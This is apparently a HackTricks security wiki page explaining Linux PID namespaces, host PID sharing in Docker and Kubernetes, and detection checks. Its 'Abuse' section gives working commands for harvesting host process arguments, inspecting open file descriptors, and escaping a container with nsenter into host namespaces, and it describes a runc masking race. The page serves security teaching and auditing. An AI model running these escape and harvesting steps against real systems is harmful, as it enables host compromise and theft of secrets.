_body: "# PID Namespace\n\n{{#include ../../../../../banners/hacktricks-training.md}}\n\n## Overview\n\nThe PID namespace\
  \ controls how processes are numbered and which processes are visible. This is why a container can have its own PID 1 even\
  \ though it is not a real machine. Inside the namespace, the workload sees what appears to be a local process tree. Outside\
  \ the namespace, the host still sees the real host PIDs and the full process landscape.\n\nFrom a security point of view,\
  \ the PID namespace matters because process visibility is valuable. Once a workload can see host processes, it may be able\
  \ to observe service names, command-line arguments, secrets passed in process arguments, environment-derived state through\
  \ `/proc`, and potential namespace-entry targets. If it can do more than just see those processes, for example by sending\
  \ signals or using ptrace under the right conditions, the problem becomes much more serious.\n\n## Operation\n\nA new PID\
  \ namespace starts with its own internal process numbering. The first process created inside it becomes PID 1 from the namespace's\
  \ point of view, which also means it gets special init-like semantics for orphaned children and signal behavior. This explains\
  \ a lot of container oddities around init processes, zombie reaping, and why tiny init wrappers are sometimes used in containers.\n\
  \nThe important security lesson is that a process may look isolated because it sees only its own PID tree, but that isolation\
  \ can be deliberately removed. Docker exposes this through `--pid=host`, while Kubernetes does it through `hostPID: true`.\
  \ Once the container joins the host PID namespace, the workload sees host processes directly, and many later attack paths\
  \ become much more realistic.\n\n## Lab\n\nTo create a PID namespace manually:\n\n```bash\nsudo unshare --pid --fork --mount-proc\
  \ bash\nps -ef\necho $$\n```\n\nThe shell now sees a private process view. The `--mount-proc` flag is important because\
  \ it mounts a procfs instance that matches the new PID namespace, making the process list coherent from inside.\n\nTo compare\
  \ container behavior:\n\n```bash\ndocker run --rm debian:stable-slim ps -ef\ndocker run --rm --pid=host debian:stable-slim\
  \ ps -ef | head\n```\n\nThe difference is immediate and easy to understand, which is why this is a good first lab for readers.\n\
  \n## Runtime Usage\n\nNormal containers in Docker, Podman, containerd, and CRI-O get their own PID namespace. Kubernetes\
  \ Pods usually also receive an isolated PID view unless the workload explicitly asks for host PID sharing. LXC/Incus environments\
  \ rely on the same kernel primitive, though system-container use cases may expose more complicated process trees and encourage\
  \ more debugging shortcuts.\n\nThe same rule applies everywhere: if the runtime chose not to isolate the PID namespace,\
  \ that is a deliberate reduction in the container boundary.\n\n## Misconfigurations\n\nThe canonical misconfiguration is\
  \ host PID sharing. Teams often justify it for debugging, monitoring, or service-management convenience, but it should always\
  \ be treated as a meaningful security exception. Even if the container has no immediate write primitive over host processes,\
  \ visibility alone can reveal a lot about the system. Once capabilities such as `CAP_SYS_PTRACE` or useful procfs access\
  \ are added, the risk expands significantly.\n\nAnother mistake is assuming that because the workload cannot kill or ptrace\
  \ host processes by default, host PID sharing is therefore harmless. That conclusion ignores the value of enumeration, the\
  \ availability of namespace-entry targets, and the way PID visibility combines with other weakened controls.\n\n## Abuse\n\
  \nIf the host PID namespace is shared, an attacker may inspect host processes, harvest process arguments, identify interesting\
  \ services, locate candidate PIDs for `nsenter`, or combine process visibility with ptrace-related privilege to interfere\
  \ with host or neighboring workloads. In some cases, simply seeing the right long-running process is enough to reshape the\
  \ rest of the attack plan.\n\nThe first practical step is always to confirm that host processes are really visible:\n\n\
  ```bash\nreadlink /proc/self/ns/pid\nps -ef | head -n 50\nls /proc | grep '^[0-9]' | head -n 20\n```\n\nOnce host PIDs are\
  \ visible, process arguments and namespace-entry targets often become the most useful information source:\n\n```bash\nfor\
  \ p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do\n  echo \"PID=$p\"\n  tr '\\0' ' ' < /proc/$p/cmdline\
  \ 2>/dev/null; echo\ndone\n```\n\nIf `nsenter` is available and enough privilege exists, test whether a visible host process\
  \ can be used as a namespace bridge:\n\n```bash\nwhich nsenter\nnsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo \"nsenter\
  \ blocked\"\n```\n\nEven when entry is blocked, host PID sharing is already valuable because it reveals service layout,\
  \ runtime components, and candidate privileged processes to target next.\n\nHost PID visibility also makes file-descriptor\
  \ abuse more realistic. If a privileged host process or neighboring workload has a sensitive file or socket open, the attacker\
  \ may be able to inspect `/proc/<pid>/fd/` and reuse that handle depending on ownership, procfs mount options, and the target\
  \ service model.\n\n```bash\nfor fd_dir in /proc/[0-9]*/fd; do\n  ls -l \"$fd_dir\" 2>/dev/null | sed \"s|^|$fd_dir -> |\"\
  \ndone\ngrep \" /proc \" /proc/mounts\n```\n\nThese commands are useful because they answer whether `hidepid=1` or `hidepid=2`\
  \ is reducing cross-process visibility and whether obviously interesting descriptors such as open secret files, logs, or\
  \ Unix sockets are visible at all.\n\n### Full Example: host PID + `nsenter`\n\nHost PID sharing becomes a direct host escape\
  \ when the process also has enough privilege to join the host namespaces:\n\n```bash\nps -ef | head -n 50\ncapsh --print\
  \ | grep cap_sys_admin\nnsenter -t 1 -m -u -n -i -p /bin/bash\n```\n\nIf the command succeeds, the container process is\
  \ now executing in the host mount, UTS, network, IPC, and PID namespaces. The impact is immediate host compromise.\n\nEven\
  \ when `nsenter` itself is missing, the same result may be achievable through the host binary if the host filesystem is\
  \ mounted:\n\n```bash\n/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null\n```\n\n### Recent Runtime Notes\n\
  \nSome PID-namespace-relevant attacks are not traditional `hostPID: true` misconfigurations, but runtime implementation\
  \ bugs around how procfs protections are applied during container setup.\n\n#### `maskedPaths` race to host procfs\n\nIn\
  \ vulnerable `runc` versions, attackers able to control the container image or `runc exec` workload could race the masking\
  \ phase by replacing container-side `/dev/null` with a symlink to a sensitive procfs path such as `/proc/sys/kernel/core_pattern`.\
  \ If the race succeeded, the masked-path bind mount could land on the wrong target and expose host-global procfs knobs to\
  \ the new container.\n\nUseful review command:\n\n```bash\njq '.linux.maskedPaths' config.json 2>/dev/null\n```\n\nThis\
  \ is important because the eventual impact may be the same as a direct procfs exposure: writable `core_pattern` or `sysrq-trigger`,\
  \ followed by host code execution or denial of service.\n\n#### Namespace injection with `insject`\n\nNamespace injection\
  \ tools such as `insject` show that PID-namespace interaction does not always require pre-entering the target namespace\
  \ before process creation. A helper can attach later, use `setns()`, and execute while preserving visibility into the target\
  \ PID space:\n\n```bash\nsudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'\n\
  ```\n\nThis kind of technique matters mainly for advanced debugging, offensive tooling, and post-exploitation workflows\
  \ where namespace context must be joined after the runtime has already initialized the workload.\n\n### Related FD Abuse\
  \ Patterns\n\nTwo patterns are worth calling out explicitly when host PIDs are visible. First, a privileged process may\
  \ keep a sensitive file descriptor open across `execve()` because it was not marked `O_CLOEXEC`. Second, services may pass\
  \ file descriptors over Unix sockets through `SCM_RIGHTS`. In both cases the interesting object is not the pathname anymore,\
  \ but the already-open handle that a lower-privilege process may inherit or receive.\n\nThis matters in container work because\
  \ the handle may point to `docker.sock`, a privileged log, a host secret file, or another high-value object even when the\
  \ path itself is not directly reachable from the container filesystem.\n\n## Checks\n\nThe purpose of these commands is\
  \ to determine whether the process has a private PID view or whether it can already enumerate a much broader process landscape.\n\
  \n```bash\nreadlink /proc/self/ns/pid   # PID namespace identifier\nps -ef | head                # Quick process list sample\n\
  ls /proc | head              # Process IDs and procfs layout\n```\n\nWhat is interesting here:\n\n- If the process list\
  \ contains obvious host services, host PID sharing is probably already in effect.\n- Seeing only a tiny container-local\
  \ tree is the normal baseline; seeing `systemd`, `dockerd`, or unrelated daemons is not.\n- Once host PIDs are visible,\
  \ even read-only process information becomes useful reconnaissance.\n\nIf you discover a container running with host PID\
  \ sharing, do not treat it as a cosmetic difference. It is a major change in what the workload can observe and potentially\
  \ affect.\n{{#include ../../../../../banners/hacktricks-training.md}}"
